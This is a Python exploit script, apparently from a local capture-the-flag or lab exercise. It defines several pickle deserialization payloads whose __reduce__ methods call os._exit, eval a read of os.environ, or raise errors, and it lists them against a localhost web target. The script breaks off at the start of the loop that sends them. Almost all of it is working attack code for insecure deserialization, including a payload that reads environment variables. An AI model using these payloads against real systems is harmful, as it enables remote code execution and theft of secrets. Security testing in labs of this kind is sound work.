import requests
import pickle
import base64

# Try different payload strategies

# Strategy 1: os._exit to terminate the process without cleanup
class PayloadExit:
    def __reduce__(self):
        return (__import__('os')._exit, (1,))

# Strategy 2: Modify the session object directly during unpickling  
class PayloadSession:
    def __reduce__(self):
        # Try modifying shown data
        return (eval, ('list(__import__("os").environ.items())[0]',))

# Strategy 3: Use int division by zero
class PayloadDivZero:
    def __reduce__(self):
        return (eval, ('1//0',))

# Strategy 4: Use getattr on None
class PayloadGetattr:
    def __reduce__(self):
        return (getattr, (None, 'nonexistent_attribute_that_causes_error'))

# Strategy 5: Call a function with wrong args
class PayloadWrongArgs:
    def __reduce__(self):
        return (pow, ('wrong', 'args', 'here'))

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

payloads = [
    ("os._exit(1)", PayloadExit()),
    ("eval environ", PayloadSession()),
    ("1//0", PayloadDivZero()),
    ("getattr None", PayloadGetattr()),
    ("wrong args", PayloadWrongArgs()),
]

for name, payload_obj in payloads:
